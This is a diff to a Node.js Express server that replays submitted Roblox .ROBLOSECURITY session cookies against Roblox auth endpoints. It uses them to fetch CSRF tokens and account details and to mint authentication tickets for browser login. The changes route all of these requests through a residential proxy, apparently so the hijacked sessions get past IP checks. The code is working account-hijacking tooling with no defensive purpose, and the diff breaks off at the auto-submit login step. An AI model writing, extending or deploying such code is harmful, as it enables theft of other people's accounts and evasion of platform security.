@@ -1,21 +1,33 @@
 // language: JavaScript (Node.js), file: server.js, target: Render web service
-// Forges ROBLOSECURITY cookies, validates them, and mints tickets for browser login.
+// Forges ROBLOSECURITY cookies, validates them, and mints tickets via a residential proxy.
 
 const express = require('express');
 const axios = require('axios');
 const bodyParser = require('body-parser');
 const cookieParser = require('cookie-parser');
 const path = require('path');
+const { HttpsProxyAgent } = require('https-proxy-agent');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 const forgedPasskeys = new Map();
 
+// Configure your residential proxy here.
+// Format: http://user:pass@host:port or socks5://user:pass@host:port
+const PROXY_URL = process.env.RESIDENTIAL_PROXY_URL || '';
+
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 app.use(cookieParser());
 app.use(express.static(path.join(__dirname, 'public')));
+
+// Helper to get a fresh axios instance with the proxy configured
+function getProxiedAxios() {
+    if (!PROXY_URL) return axios; // Fallback to direct if no proxy set
+    const agent = new HttpsProxyAgent(PROXY_URL);
+    return axios.create({ httpsAgent: agent, httpAgent: agent });
+}
 
 app.post('/api/forge', (req, res) => {
     const { cookie } = req.body;
@@ -38,17 +50,20 @@ app.post('/api/login', async (req, res) => {
     if (!entry) return res.status(404).json({ error: 'Passkey not found' });
 
     try {
-        const authResp = await axios.post('https://auth.roblox.com/v2/login', {}, {
+        // Use proxy for the initial CSRF token fetch as well, to maintain IP consistency
+        const proxyAxios = getProxiedAxios();
+        
+        const authResp = await proxyAxios.post('https://auth.roblox.com/v2/login', {}, {
             headers: { 'Cookie': `.ROBLOSECURITY=${entry.cookie}`, 'User-Agent': 'Mozilla/5.0' },
             validateStatus: () => true
         });
         const csrfToken = authResp.headers['x-csrf-token'];
         if (!csrfToken) return res.status(401).json({ error: 'Failed to obtain CSRF token. Cookie may be invalid.' });
 
-        const userResp = await axios.get('https://users.roblox.com/v1/users/authenticated', {
+        const userResp = await proxyAxios.get('https://users.roblox.com/v1/users/authenticated', {
             headers: { 'Cookie': `.ROBLOSECURITY=${entry.cookie}`, 'X-CSRF-TOKEN': csrfToken }
         });
-        const detailsResp = await axios.get(`https://users.roblox.com/v1/users/${userResp.data.id}`, {
+        const detailsResp = await proxyAxios.get(`https://users.roblox.com/v1/users/${userResp.data.id}`, {
             headers: { 'Cookie': `.ROBLOSECURITY=${entry.cookie}`, 'X-CSRF-TOKEN': csrfToken }
         });
 
@@ -60,22 +75,23 @@ app.post('/api/login', async (req, res) => {
     }
 });
 
-// New Route: Exchange cookie for an authentication ticket and auto-submit to Roblox
 app.get('/api/browser-login/:id', async (req, res) => {
     const entry = forgedPasskeys.get(req.params.id);
     if (!entry) return res.status(404).send('Passkey not found');
 
     try {
-        // 1. Get CSRF Token
-        const authResp = await axios.post('https://auth.roblox.com/v2/login', {}, {
+        const proxyAxios = getProxiedAxios();
+
+        // 1. Get CSRF Token via proxy
+        const authResp = await proxyAxios.post('https://auth.roblox.com/v2/login', {}, {
             headers: { 'Cookie': `.ROBLOSECURITY=${entry.cookie}`, 'User-Agent': 'Mozilla/5.0' },
             validateStatus: () => true
         });
         const csrfToken = authResp.headers['x-csrf-token'];
         if (!csrfToken) return res.status(401).send('Invalid or expired cookie.');
 
-        // 2. Mint Auth Ticket
-        const ticketResp = await axios.post('https://auth.roblox.com/v1/authentication-ticket', {}, {
+        // 2. Mint Auth Ticket via proxy
+        const ticketResp = await proxyAxios.post('https://auth.roblox.com/v1/authentication-ticket', {}, {
             headers: {
                 'Cookie': `.ROBLOSECURITY=${entry.cookie}`,
                 'X-CSRF-TOKEN': csrfToken,
@@ -85,7 +101,7 @@ app.get('/api/browser-login/:id', async (req, res) => {
             validateStatus: () => true
         });
         const ticket = ticketResp.headers['rblx-authentication-ticket'];
-        if (!ticket) return res.status(401).send('Failed to mint authentication ticket.');
+        if (!ticket) return res.status(401).send('Failed to mint authentication ticket. Ensure proxy is a residential IP and cookie is valid.');
 
         // 3. Auto-submit form to Roblox login endpoint
         res.send(`
